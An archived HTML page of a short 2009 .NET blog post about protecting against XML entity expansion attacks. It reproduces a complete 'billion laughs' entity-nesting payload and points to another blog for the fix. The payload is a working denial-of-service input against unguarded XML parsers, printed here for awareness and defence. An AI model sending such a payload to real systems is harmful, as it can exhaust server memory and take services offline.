<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head profile="http://gmpg.org/xfn/1">
	<title>.NET Junkie - Protecting against XML Entity Expansion attacks</title>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<link rel="stylesheet" href="/blogs/steven/pivot/templates/layout12.css" type="text/css" />
	<!--[if IE]>
	<link rel="stylesheet" href="/blogs/steven/pivot/templates/layout7_ie.css" type="text/css" />
	<![endif]-->
	<!--[if !IE]>-->
	<link rel="stylesheet" href="/blogs/steven/pivot/templates/layout7_ff.css" type="text/css" />
	<!--<![endif]-->
	<link rel="stylesheet" href="/blogs/steven/extensions/calendar/calendar.css" type="text/css" media="screen" />
	<link rel="stylesheet" href="/blogs/steven/pivot/templates/mobile.css?changed=20121020a" type="text/css" />
	<link rel="stylesheet" href="/blogs/steven/pivot/templates/print.css?changed=20110919" type="text/css" media="print" />
	<link rel="alternate" type="application/rss+xml" title="RSS" href="/blogs/steven/rss.xml" />
	<link rel="alternate" type="application/atom+xml" title="Atom" href="/blogs/steven/atom.xml" />
	<style>
		#NoJavascriptWarning {
			width: 100%;
			border: solid 3px red;
			color: black;
			padding: 3px;
		}
	</style>
<script src="/blogs/steven/pivot/includes/js/jquery.js" type="text/javascript"></script>
<script type="text/javascript">
<!--
function GXdwbqjvRlDYrUDsv(){ $('input[@name=post]').attr('disabled', ''); }
function hxhKdIeSOQGAT(){return 57 + 0 + 1 + 2 + 3 + 4 + 5 + 6 + 7 + 8 + 9 + 10 + 11 + 12 + 13 + 14 + 15 + 16 + 17 + 18 + 19 + 20 + 21 + 22 + 23 + 24 + 25 + 26 + 27 + 28 + 29 + 30 + 31 + 32 + 33 + 34 + 35 + 36 + 37 + 38 + 39 + 40 + 41 + 42 + 43 + 44 + 45 + 46 + 47 + 48 + 49 + 50 + 51 + 52 + 53 + 54 + 55 + 56 + 57 + 58 + 59 + 60 + 61 + 62 + 63 + 64 + 65 + 66 + 67 + 68 + 69 + 70 + 71 + 72 + 73 + 74 ;}  function qhHrYy(num,cnt){return(num<<cnt)|(num>>>(32-cnt));} function eDxRw(hIM){var Y=Array();var A=(1<<8)-1;for(var i=0;i<hIM.length*8;i+=8)Y[i>>5]|=(hIM.charCodeAt(i/8)&A)<<(i%32);return Y;} function oNFvdrIvkCZ(s){return qom(OLk(eDxRw(s),s.length*8));} function W(a,b,c,d,x,s,t){return N(c ^(b|(~d)),a,b,x,s,t);} function N(q,a,b,x,s,t){return iOPXS(qhHrYy(iOPXS(iOPXS(a,q),iOPXS(x,t)),s),b);}function UV(a,b,c,d,x,s,t){return N((b&c)|((~b)&d),a,b,x,s,t);} function iOPXS(x,y){var lsw=(x&0xFFFF)+(y&0xFFFF);var msw=(x>>16)+(y>>16)+(lsw>>16);return(msw<<16)|(lsw&0xFFFF);} function agJDJq(a,b,c,d,x,s,t){return N(b ^ c ^ d,a,b,x,s,t);} function OLk(x,len){x[len>>5]|=0x80<<((len)%32);x[(((len+64)>>>9)<<4)+14]=len;var a=1732584193;var b=-271733879;var c=-1732584194;var d=271733878;for(var i=0;i<x.length;i+=16){var olda=a;var oldb=b;var oldc=c;var oldd=d;a=UV(a,b,c,d,x[i+0],7,-680876936);d=UV(d,a,b,c,x[i+1],12,-389564586);c=UV(c,d,a,b,x[i+2],17,606105819);b=UV(b,c,d,a,x[i+3],22,-1044525330);a=UV(a,b,c,d,x[i+4],7,-176418897);d=UV(d,a,b,c,x[i+5],12,1200080426);c=UV(c,d,a,b,x[i+6],17,-1473231341);b=UV(b,c,d,a,x[i+7],22,-45705983);a=UV(a,b,c,d,x[i+8],7,1770035416);d=UV(d,a,b,c,x[i+9],12,-1958414417);c=UV(c,d,a,b,x[i+10],17,-42063);b=UV(b,c,d,a,x[i+11],22,-1990404162);a=UV(a,b,c,d,x[i+12],7,1804603682);d=UV(d,a,b,c,x[i+13],12,-40341101);c=UV(c,d,a,b,x[i+14],17,-1502002290);b=UV(b,c,d,a,x[i+15],22,1236535329);a=kO(a,b,c,d,x[i+1],5,-165796510);d=kO(d,a,b,c,x[i+6],9,-1069501632);c=kO(c,d,a,b,x[i+11],14,643717713);b=kO(b,c,d,a,x[i+0],20,-373897302);a=kO(a,b,c,d,x[i+5],5,-701558691);d=kO(d,a,b,c,x[i+10],9,38016083);c=kO(c,d,a,b,x[i+15],14,-660478335);b=kO(b,c,d,a,x[i+4],20,-405537848);a=kO(a,b,c,d,x[i+9],5,568446438);d=kO(d,a,b,c,x[i+14],9,-1019803690);c=kO(c,d,a,b,x[i+3],14,-187363961);b=kO(b,c,d,a,x[i+8],20,1163531501);a=kO(a,b,c,d,x[i+13],5,-1444681467);d=kO(d,a,b,c,x[i+2],9,-51403784);c=kO(c,d,a,b,x[i+7],14,1735328473);b=kO(b,c,d,a,x[i+12],20,-1926607734);a=agJDJq(a,b,c,d,x[i+5],4,-378558);d=agJDJq(d,a,b,c,x[i+8],11,-2022574463);c=agJDJq(c,d,a,b,x[i+11],16,1839030562);b=agJDJq(b,c,d,a,x[i+14],23,-35309556);a=agJDJq(a,b,c,d,x[i+1],4,-1530992060);d=agJDJq(d,a,b,c,x[i+4],11,1272893353);c=agJDJq(c,d,a,b,x[i+7],16,-155497632);b=agJDJq(b,c,d,a,x[i+10],23,-1094730640);a=agJDJq(a,b,c,d,x[i+13],4,681279174);d=agJDJq(d,a,b,c,x[i+0],11,-358537222);c=agJDJq(c,d,a,b,x[i+3],16,-722521979);b=agJDJq(b,c,d,a,x[i+6],23,76029189);a=agJDJq(a,b,c,d,x[i+9],4,-640364487);d=agJDJq(d,a,b,c,x[i+12],11,-421815835);c=agJDJq(c,d,a,b,x[i+15],16,530742520);b=agJDJq(b,c,d,a,x[i+2],23,-995338651);a=W(a,b,c,d,x[i+0],6,-198630844);d=W(d,a,b,c,x[i+7],10,1126891415);c=W(c,d,a,b,x[i+14],15,-1416354905);b=W(b,c,d,a,x[i+5],21,-57434055);a=W(a,b,c,d,x[i+12],6,1700485571);d=W(d,a,b,c,x[i+3],10,-1894986606);c=W(c,d,a,b,x[i+10],15,-1051523);b=W(b,c,d,a,x[i+1],21,-2054922799);a=W(a,b,c,d,x[i+8],6,1873313359);d=W(d,a,b,c,x[i+15],10,-30611744);c=W(c,d,a,b,x[i+6],15,-1560198380);b=W(b,c,d,a,x[i+13],21,1309151649);a=W(a,b,c,d,x[i+4],6,-145523070);d=W(d,a,b,c,x[i+11],10,-1120210379);c=W(c,d,a,b,x[i+2],15,718787259);b=W(b,c,d,a,x[i+9],21,-343485551);a=iOPXS(a,olda);b=iOPXS(b,oldb);c=iOPXS(c,oldc);d=iOPXS(d,oldd);}return Array(a,b,c,d);} function bHOoGquKQKrZ(NNbgBaNznX){ TdzqAJ = document.getElementById("RLsIQN"); if(!TdzqAJ){ return false; } else { TdzqAJ.name = oNFvdrIvkCZ(NNbgBaNznX); TdzqAJ.value = hxhKdIeSOQGAT(); return true; }} function kO(a,b,c,d,x,s,t){return N((b&d)|(c&(~d)),a,b,x,s,t);} function qom(hue){var Rbr="0123456789abcdef";var str="";for(var i=0;i<hue.length*4;i++){str+=Rbr.charAt((hue[i>>2]>>((i%4)*8+4))&0xF)+Rbr.charAt((hue[i>>2]>>((i%4)*8))&0xF);}return str;}
$(document).ready(function(){ setTimeout("GXdwbqjvRlDYrUDsv()", 100); });
// -->
</script>

</head>
<script type="text/javascript" src="/blogs/steven/pivot/templates/includes5.js"></script>
<script type="text/javascript">runAfterHead('/blogs/steven/pivot/templates/');</script>
<body>
	<div id="page">
		<div id="header">
			<h1><a href="/blogs/steven/index.php" title=".NET Junkie">.NET Junkie</a></h1>
			<div class="description">Weblog of a workaholic</div>
		</div>
		
		<hr />
		
		<div id="content" class="narrowcolumn">
			<div class="post">
				<span class="printpost">
					<a	title="Show a printer-friendly version of this page"
						target="_new"
						href="http://www.cuttingedge.it/blogs/steven/pivot/entry.php?id=48&print=true">
						<img alt="Print" src="/blogs/steven/pivot/templates/images/print.gif" />
					</a>
				</span>
				<div class="entry" id="entry">
					<span class="entrydate">23 May 09</span>
					<h3><a href="http://www.cuttingedge.it/blogs/steven/pivot/entry.php?id=48">Protecting against XML Entity Expansion attacks</a></h3>
			
					<h4>Tom Hollander describes on his blog a denial of service attack I never knew the existence of, called XML Entity Expansion attack. Tom explains how to bring a server to its knees when allowing any type of xml document as input and passing it directly to an XmlDocument for parsing.</h4>
					
					<div id="entry_body">
						<a id="body"></a><p>Tom uses the following XML document of less than 1 KB to demonstrate the attack:</p><pre class="cs" language="csharp" customtypes="PutYourCustomTypesHere" customvaluetypes="PutYourCustomValueTypesHere">&lt;!DOCTYPE foo [ <br />&lt;!ENTITY a &quot;1234567890&quot; &gt; <br />&lt;!ENTITY b &quot;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&amp;a;&quot; &gt; <br />&lt;!ENTITY c &quot;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&amp;b;&quot; &gt; <br />&lt;!ENTITY d &quot;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&amp;c;&quot; &gt; <br />&lt;!ENTITY e &quot;&amp;d;&amp;d;&amp;d;&amp;d;&amp;d;&amp;d;&amp;d;&amp;d;&quot; &gt; <br />&lt;!ENTITY f &quot;&amp;e;&amp;e;&amp;e;&amp;e;&amp;e;&amp;e;&amp;e;&amp;e;&quot; &gt; <br />&lt;!ENTITY g &quot;&amp;f;&amp;f;&amp;f;&amp;f;&amp;f;&amp;f;&amp;f;&amp;f;&quot; &gt; <br />&lt;!ENTITY h &quot;&amp;g;&amp;g;&amp;g;&amp;g;&amp;g;&amp;g;&amp;g;&amp;g;&quot; &gt; <br />&lt;!ENTITY i &quot;&amp;h;&amp;h;&amp;h;&amp;h;&amp;h;&amp;h;&amp;h;&amp;h;&quot; &gt; <br />&lt;!ENTITY j &quot;&amp;i;&amp;i;&amp;i;&amp;i;&amp;i;&amp;i;&amp;i;&amp;i;&quot; &gt; <br />&lt;!ENTITY k &quot;&amp;j;&amp;j;&amp;j;&amp;j;&amp;j;&amp;j;&amp;j;&amp;j;&quot; &gt; <br />&lt;!ENTITY l &quot;&amp;k;&amp;k;&amp;k;&amp;k;&amp;k;&amp;k;&amp;k;&amp;k;&quot; &gt; <br />&lt;!ENTITY m &quot;&amp;l;&amp;l;&amp;l;&amp;l;&amp;l;&amp;l;&amp;l;&amp;l;&quot; &gt; <br />]&gt; <br />&lt;foo&gt;&amp;m;&lt;/foo&gt;</pre><p>See <a rel="external" href="http://blogs.msdn.com/tomholl/archive/2009/05/21/protecting-against-xml-entity-expansion-attacks.aspx" title="Tom Hollander's blog - Protecting against XML Entity Expansion attacks">his post</a> for more information and the proposed remedy.</p>
					</div>
					
					<div id="listOfLinks"></div>
					
					<p class="info dontPrint">
						<span class="poster"><script type="text/javascript">
<!--
	var first = 'ma';
	var second = 'il';
	var third = 'to:';
	var address = '';
	var domain = '&#115;&#116;&#101;&#118;&#101;&#110;&#32;&#97;&#116;&#32;&#116;&#104;&#105;&#115;&#32;&#100;&#111;&#109;&#97;&#105;&#110;';
	document.write('<a href="');
	document.write(first+second+third);
	document.write(address);
	document.write('&#64;');
	document.write(domain);
	document.write('" title="Email Steven">');
	document.write('Steven<\/a>');
// -->
</script></span> - <span class="category"><a href="/blogs/steven/pivot/archive.php?c=.NET_General">.NET General</a>, <a href="/blogs/steven/pivot/archive.php?c=Security">Security</a></span> - 
						<span class="comments"><a href="/blogs/steven/pivot/entry.php?id=48#comm" title="">No comments</a> /  <a href="/blogs/steven/pivot/entry.php?id=48#track" title="">No trackbacks</a></span> - 
						<a href="/blogs/steven/archives/archive_2009-m05.php#e48" title="Permanent link to 'Protecting against XML Entity Expansion attacks' in the archives">&sect;</a> <a href="/blogs/steven/pivot/entry.php?id=48" title="Permanent link to entry 'Protecting against XML Entity Expansion attacks'">&para;</a> 
					</p>
					
					<div id="NoJavascriptWarning">
						The code samples on my weblog are colorized using javascript, but
						you disabled javascript (for my website) on your browser. 
						If you're interested in viewing the posted code snippets in 
						color, please enable javascript.
					</div>
					<script type="text/javascript">
						var noScriptWarning = document.getElementById('NoJavascriptWarning');
						noScriptWarning.style.display = "none";
					</script>
				</div>
			</div>
			
			<hr style="height:1px; background-color:#999; color:#999; border: none;" />

			<p><b>No comments:</b></p>
			<div class="comments">
			<a id="comm"></a>

			</div>

		</div>

		<hr />
		
		<div id="footer">
			<p>&copy; 2007-2019 Steven van Deursen.<br /><span class="dontPrint"><a href="/blogs/steven/rss.xml" title="XML: RSS Feed" rel="nofollow external" class="badge"><img src="/blogs/steven/pivot/pics/rssbutton.png" width="94" height="15" alt="XML: RSS Feed" class="badge" longdesc="/blogs/steven/rss.xml" /></a> <a href="/blogs/steven/atom.xml" title="XML: Atom Feed" rel="nofollow external" class="badge"><img src="/blogs/steven/pivot/pics/atombutton.png" width="94" height="15" alt="XML: Atom Feed" class="badge" longdesc="/blogs/steven/atom.xml" /></a></span>
			</p>
		</div>
	</div>
</body>
<script type="text/javascript" src="/blogs/steven/pivot/templates/CSharpCodeHighlighter0.10.js"></script>
<script type="text/javascript" src="/blogs/steven/pivot/templates/MSILCodeHighlighter0.1.js"></script>
<script type="text/javascript" src="/blogs/steven/pivot/templates/X86CodeHighlighter0.1.js"></script>
<script type="text/javascript">runAfterBody('/blogs/steven/pivot/templates/');</script>
</html>